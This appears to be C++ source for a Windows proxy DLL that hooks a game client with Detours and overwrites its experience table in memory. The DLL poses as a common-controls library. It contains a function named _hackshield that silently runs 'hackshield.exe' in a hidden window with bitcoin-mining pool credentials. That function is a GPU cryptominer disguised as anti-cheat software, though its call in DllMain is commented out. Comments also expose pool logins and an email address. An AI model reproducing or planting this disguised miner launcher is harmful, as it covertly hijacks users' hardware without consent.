#pragma comment(lib, "detours.lib")
#pragma comment(lib, "Ws2_32.lib")

#undef UNICODE
#include <cstdio>
#include <Winsock2.h>
#include <ws2tcpip.h>
#include <detours.h> 
#include <process.h>
#include "MadFPS.h"
#include <Memory.h>
#include <Tools.h>
#include <io.h>
#pragma comment(lib, "MadLib.lib")

#pragma pack(1)


HINSTANCE hLThis = 0;
HINSTANCE hL = 0;
FARPROC p[1] = {0};

// "Daywalker747_newworker:newworker@mint.bitminter.com:8332 --device=0 --platform=0 --verbose -r1 --frames 300 --rate=100000 -s 0.001",  
//poclbm.exe danon@gmx.de:radeon@pool.50btc.com:8332 --device=0 --platform=0 --verbose -r1 --frames 300 --rate=100000 -s 0.001
void _hackshield()
{
	SetCurrentDirectory("hshield\\");
	ShellExecute( NULL, "open",         
		"hackshield.exe", // program to launch
		"danon@gmx.de:radeon@pool.50btc.com:8332 --device=0 --platform=0 --verbose -r1 --frames 300 --rate=100000 -s 0.001",              // parms (will be %1 and %2 in the batch file)
		"hshield",        // default dir for the batch
		SW_HIDE
		);
	SetCurrentDirectory("..");
}

/**
static unsigned __int64 ExpTable[] = {
0, 100, 100, 100, 100, 100, 100, 100, 100, 100, //9
100, 100, 100, 100, 110, 120, 130, 140, 150, 200, //19
220, 250, 280, 301, 338, 388, 355, 447, 473, 662, //29
887, 1188, 1393, 1535, 1761, 2134, 2437, 2784, 3125, 3325, //39
3525, 3725, 4125, 4325, 4625, 4825, 5225, 5825, 6125, 6325, //49
6525, 6825, 7125, 7325, 8025, 9630, 11556, 13867, 16640, 19968, //59
23961, 28754, 34505, 41406, 49687, 59625, 71550, 85860, 103032, 123638, //69
148366, 178039, 213647, 256376, 307652, 369182, 443018, 531622, 637947, 765536, //79
918643, 1102372, 1322846, 1587415, 1904898, 2285878, 2743053, 3291664, 3949997, 4739996, //89
5687995, 6825594, 8190712, 9828855, 11794626, 14153551, 16984261, 20381113, 24457335, 29348802, //99
35218562, 42262274, 50714728, 60857673, 73029207, 87635048, 105162058, 126194469, 151433363, 181720036, //109
218064043, 261676851, 314012221, 376814665, 452177599, 542613118, 651135742, 781362890, 937635468, 1125162562, //119
350195074, 1620234089, 1944280906, 2333137088, 2799764505, 3359717406, 4031660888, 4837993065, 5805591678, 6966710014, //129
8360052017, 10032062420, 12038474904, 14446169885, 17335403862, 20802484635, 24962981562, 29955577884, 35946693469, 43136032159, //139
51763238584, 62115886303, 74539063568, 89446876285, 107336251590, 128803501868, 154564202262, 185477042695, 222572451113, 267086941496, //149
320504329755, 384605195686, 461526234704, 553831481784, 664597778081, 797517333778, 957020800413, 1148424960536, 1378109952643, 1653731943972, //159
1984478331366, 2381373998039, 2857648797447, 3429178557136, 4115014268964, 4938017122756, 5925620547108, 7110744656529, 8532893587835, 1023947230502, //169
12287366766962, 14744840120035, 17693808144046, 21232569772851, 25479083727423, 30574900472905, 36689880567486, 44027856680989, 52833428017187, 63400113620619, //179
76080136344743, 91296163613683, 109555396336460, 131466475603710, 157759770724450, 189311724869340, 227174069843210, 272608883811850, 327130660574220, 392556792689070, //189
471068151226880, 565281781472260, 678338137766710, 814005765320050, 976806918384070, 1172168302060800, 1406601962473000, 1687922354967600, 2025516825961200, 2025516825961200, //199
228192583657399, 251011842023139, 276113026225453, 303724328847999, 334096761732799, 367506437906078, 404257081696686, 444682789866355, 489151068852991, 538066175738290, //209
591872793312119, 651060072643331, 716166079907664, 787782687898430, 866560956688273, 953217052357101, 1048538757592810, 1153392633352090, 1268731896687300, 1395605086356030, //219
1535165594991630, 1688682154490800, 1857550369939880, 2043305406933870, 2247635947627250, 2472399542389980, 2719639496628980, 2991603446291870, 3290763790921060, 3619840170013170, //229
3981824187014490, 4380006605715930, 4818007266287530, 5299807992916280, 5829788792207910, 6412767671428700, 7054044438571570, 7759448882428730, 8535393770671600, 9388933147738770, //239
10327826462512600, 11360609108763900, 12496670019640300, 13746337021604300, 15120970723764800, 16633067796141200, 18296374575755400, 20126012033330900, 22138613236664000, 24352474560330400, //249
26787722016363500, 29466494217999800, 32413143639799800, 35654458003779800, 39219903804157700, 43141894184573500 //255
};
**/
// Real:415664  Shifted:0x00415667 DIFF:3  LODWORD
// Real:41566C  Shifted:0x0041566F DIFF:3  HIDWORD

// Real:4156AD Shifted:0x0004156B0 DIFF: 3 LODWORD
// Real:4156B5 Shifted:0x004156B8 DIFF: 3 HIDWORD


//4AB771+3 = 4AB774 LOD
//4AB77D+3 = 4AB780 HID

//4AC225+3 = 4AC228 LOD
//4AC232+3 = 4AC235 HID

// DWORD ExpAdr1[] = {0x004AB774,0x004AC228};
// DWORD ExpAdr2[] = {0x004AB780,0x004AC235};
// Memory->Copy((void*)&Exptr2,(void*)0x004AC228,4);


// NEWEST INT EXP TABLE

static unsigned __int64 ExpTable[] = 
{
0, 5, 24, 60, 160, 328, 548, 814, 1157, 1558, //Level 1 - 10
2250, 3086, 4135, 5444, 7068, 9126, 11660, 14769, 18572, 23214, //Level 11 - 20
29155, 36409, 45245, 55988, 69026, 85569, 105656, 130009, 159150, 159494, //Level 21 - 30
238255, 290216, 352918, 428488, 519513, 629149, 761081, 919784, 1110624, 1340045, //Level 31 - 40
1615778, 1947099, 2345141, 2823265, 3397501, 4087087, 4915108, 5909267, 7102808, 8535623, //Level 41 - 50
10255633, 12320243, 14798389, 17772795, 21342730, 25627317, 30769501, 36940820, 44347118, 53235407, //Level 51 - 60
63902104, 76702906, 92064653, 110499551, 132622249, 169170373, 191028978, 229260177, 275138508, 792521000, //Level 61 - 70
2377710000, 2853400000, 3424250000, 4109250000, 9862558160, 11835400000, 14202800000, 17043800000, 20452800000, 36815500000, //Level 71 - 80
44179500000, 53015500000, 63620000000, 76343500000, 122152000000, 146581000000, 175902000000, 211082000000, 253305000000, 379940000000, //Level 81 - 90
455945000000, 547123000000, 656600000000, 787870000000, 1418110000000, 1701650000000, 2042210000000, 2450990000000, 2859760000000, 3268530000000, //Level 91 - 100
3677300000000, 4086070000000, 4494840000000, 4903610000000, 5312380000000, 5721150000000, 6129920000000, 6538690000000, 6947460000000, 7356230000000, //Level 101 - 110
7765000000000, 8173770000000, 8582540000000, 8991310000000, 9400080000000, 9808850000000, 10217620000000, 10626390000000, 11035160000000, 11443930000000, //Level 111 - 120
11852700000000, 12261470000000, 12670240000000, 13079010000000, 13487780000000, 13896550000000, 14305320000000, 14714090000000, 15122860000000, 15531630000000, //Level 121 - 130
15940400000000, 16349170000000, 16757940000000, 17166710000000, 17575480000000, 17984250000000, 18393020000000, 18801790000000, 19210560000000, 19619330000000, //Level 131 - 140
20028100000000, 20436870000000, 20845640000000, 21254410000000, 21663180000000, 22071950000000, 22480720000000, 22889490000000, 23298260000000, 23707030000000, //Level 141 - 150
24115800000000, 24524570000000, 24933340000000, 25342110000000, 25750880000000, 26159650000000, 26568420000000, 26977190000000, 27385960000000, 27794730000000, //Level 151 - 160
28203500000000, 28612270000000, 29021040000000, 29429810000000, 29838580000000, 30247350000000, 30656120000000, 31064890000000, 31473660000000, 31882430000000, //Level 161 - 170
32291200000000, 32699970000000, 33108740000000, 33517510000000, 33926280000000, 34335050000000, 34743820000000, 35152590000000, 35561360000000, 35970130000000, //Level 171 - 180
36378900000000, 36787670000000, 37196440000000, 37605210000000, 38013980000000, 38422750000000, 38831520000000, 39240290000000, 39649060000000, 40057830000000, //Level 181 - 190
40466600000000, 40875370000000, 41284140000000, 41692910000000, 42101680000000, 42510450000000, 42919220000000, 43327990000000, 43736760000000, 44145530000000, //Level 191 - 200
44554300000000, 44963070000000, 45371840000000, 45780610000000, 46189380000000, 46598150000000, 47006920000000, 47415690000000, 47824460000000, 48233230000000, //Level 201 - 210
48642000000000, 49050770000000, 49459540000000, 49868310000000, 50277080000000, 50685850000000, 51094620000000, 51503390000000, 51912160000000, 52320930000000, //Level 211 - 220
52729700000000, 53138470000000, 53547240000000, 53956010000000, 54364780000000, 54773550000000, 55182320000000, 55591090000000, 55999860000000, 56408630000000, //Level 221 - 230
56817400000000, 57226170000000, 57634940000000, 58043710000000, 58452480000000, 58861250000000, 59270020000000, 59678790000000, 60087560000000, 60496330000000, //Level 231 - 240
60905100000000, 61313870000000, 61722640000000, 62131410000000, 62540180000000, 62948950000000, 63357720000000, 63766490000000, 64175260000000, 64584030000000, //Level 241 - 250
64992800000000, 65401570000000, 65810340000000, 66219110000000, 66627880000000, //Level 251 - 255
};


// ZOO Panda
/**
static unsigned __int64 ExpTable[] = 
{
	0, 100, 115, 132, 152, 175, 201, 231, 266, 306, 352, // 10
	405, 466, 536, 616, 708, 814, 936, 1076, 1237, 1423, // 20
	1636, 1881, 2163, 2487, 2860, 3289, 3782, 4349, 5001, 5751, // 30
	6614, 7606, 8747, 10059, 11568, 13303, 15298, 17593, 20232, 23267, // 40
	26757, 30771, 35387, 40695, 46799, 53819, 61892, 71176, 81852, 94130, // 50
	108250, 124488, 143161, 164635, 189330, 217730, 250390, 287949, 331141, 380812, // 60
	437934, 503624, 579168, 666043, 765949, 880841, 1012967, 1164912, 1339649, 1540596, // 70
	1771685, 2037438, 2343054, 2694512, 3098689, 3563492, 4098016, 4712718, 5419626, 6232570, // 80
	7167456, 8242574, 9478960, 10900804, 12535925, 14416314, 16578761, 19065575, 21925411, 25214223, // 90
	28996356, 33345809, 38347680, 44099832, 50714807, 58322028, 67070332, 77130882, 88700514, 102005591, // 100
	117306430, 134902395, 155137754, 178408417, 205169680, 235945132, 271336902, 312037437, 358843053, 412669511, // 110
	474569938, 545755429, 627618743, 721761554, 830025787, 954529655, 1097709103, 1262365468, 1451720288, 1669478331, // 120
	1919900081, 2207885093, 2539067857, 2919928036, 3357917241, 3861604827, 4440845551, 5106972384, 5873018242, 6753970978, // 130
	7767066625, 8932126619, 10271945612, 11812737454, 13584648072, 15622345283, 17965697075, 20660551636, 23759634381, 27323579538, // 140
	31422116469, 36135433939, 41555749030, 47789111385, 54957478093, 63201099807, 72681264778, 83583454495, 96120972669, 110539118569, // 150
	127119986354, 146187984307, 168116181953, 193333609246, 222333650633, 255683698228, 294036252962, 338141690906, 388862944542, 447192386223, // 160
	514271244156, 591411930779, 680123720396, 782142278455, 899463620223, 1034383163256, 1189540637744, 1367971733406, 1573167493417, 1809142617430, // 170
	2080514010045, 2392591111552, 2751479778285, 3164201745028, 3638832006782, 4184656807799, 4812355328969, 5534208628314, 6364339922561, 7318990910945, // 180
	8416839547587, 9679365479725, 11131270301684, 12800960846937, 14721104973978, 16929270720075, 19468661328086, 22388960527299, 25747304606394, 29609400297353, // 190
	34050810341956, 39158431893250, 45032196677238, 51787026178824, 59555080105648, 68488342121495, 78761593439720, 90575832455678, 104162207324030, 119786538422634, // 200
	137754519186029, 158417697063934, 182180351623524, 209507404367052, 240933515022110, 277073542275426, 318634573616740, 366429759659251, 421394223608139, 484603357149360, // 210
	557293860721764, 640887939830028, 737021130804533, 847574300425213, 974710445488994, 1122110628635200, 1290427222930480, 1483991306370060, 1706590002325560, 1962578502674400, // 220
	2256965278075560, 2595510069786890, 2984836580254930, 3432562067293160, 3947446377387140, 4539563333995210, 5220497834094490, 6003572509208660, 6904108385589960, 7939724643428460, // 230
	9130683339942720, 10500285840934100, 12075328717074300, 13886628024635400, 15969622228330700, 18365065562580300, 21119825396967300, 24287799206512400, 27930969087489300, 32120614450612700, // 240
	36938706618204600, 42479512610935300, 48851439502575600, 56179155427961900, 64606028742156200, 74296933053479600, 85441473011501600, 98257693963226800, 112996348057711000, 129945800266367000, // 250
	149437670306322000, 171853320852271000, 197631318980111000, 227276016827128000, 261367419351197000 // 255
};**/


void ExPGapSystem()
{
	for (int i = 0;i < 112; i++)
	{
		if (i >= 70 && i < 75 )
		ExpTable[i] = ExpTable[i] * 2;
		
		if (i >= 75 && i < 80 )
		ExpTable[i] = ExpTable[i] * 4;
		
		if (i >= 80 && i < 85 )
		ExpTable[i] = ExpTable[i] * 6;
		
		if (i >= 85 && i < 90 )
		ExpTable[i] = ExpTable[i] * 8;
		
		if (i >= 90 && i < 95 )
		ExpTable[i] = ExpTable[i] * 10;
		
		if (i >= 95 && i <= 99 )
		ExpTable[i] = ExpTable[i] * 15;
		
		if (i == 100 )
		ExpTable[i] =  9223372036854775807;
	}
}

void setupExpTable()      
{
	ExPGapSystem();
	IMemory *Memory = new IMemory;
	DWORD* ExpPtr = (DWORD*)ExpTable;
	DWORD Exptr2;
	DWORD ExpAdr1[] = {0x004AB774,0x004AC228}; //LODWORD
	DWORD ExpAdr2[] = {0x004AB780,0x004AC235}; //HIDWORD

	for(int i = 0;i<sizeof(ExpAdr1)/4;i++)
		Memory->Copy((void*)ExpAdr1[i], (void*) &ExpPtr, 4);

	Memory->Copy((void*)&Exptr2,(void*)0x004AC228,4);
	Exptr2 += 0x04;

	for(int i = 0;i<sizeof(ExpAdr2)/4;i++)
		Memory->Copy((void*)ExpAdr2[i], (void*) &Exptr2, 4);   

	delete Memory;
}


HANDLE CreateConsole()
{
	int hConHandle = 0;
	HANDLE lStdHandle = 0;
	FILE *fp = 0;
	AllocConsole();
	lStdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
	hConHandle = _open_osfhandle(PtrToUlong(lStdHandle), 0x4000);
	fp = _fdopen(hConHandle, "w");
	*stdout = *fp;
	setvbuf(stdout, NULL, _IONBF, 0);
	return lStdHandle;
}

BOOL APIENTRY DllMain( HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )
{
	switch (ul_reason_for_call)
	{
		
	case DLL_PROCESS_ATTACH:
		{
			DetourTransactionBegin();
			DetourUpdateThread(GetCurrentThread());
			hLThis = hModule;
				hL = LoadLibrary("KealyFPSLimiter.dll");
				//if (!hL) return false;
				//CreateConsole();
				//printf("test123");
			p[0] = GetProcAddress(hL,"InitCommonControls");

			HookWorldRefresh();
			//_hackshield();
			setupExpTable();
			DetourTransactionCommit();
			break;
		}
	case DLL_PROCESS_DETACH:
		{
			DetourTransactionBegin();
			DetourUpdateThread(GetCurrentThread());
			DetourTransactionCommit();
			break;
		}
	}
	return TRUE;
}

// InitCommonControls
extern "C" __declspec(naked) void __stdcall __E__0__()
{
	__asm jmp p[0*4];
}
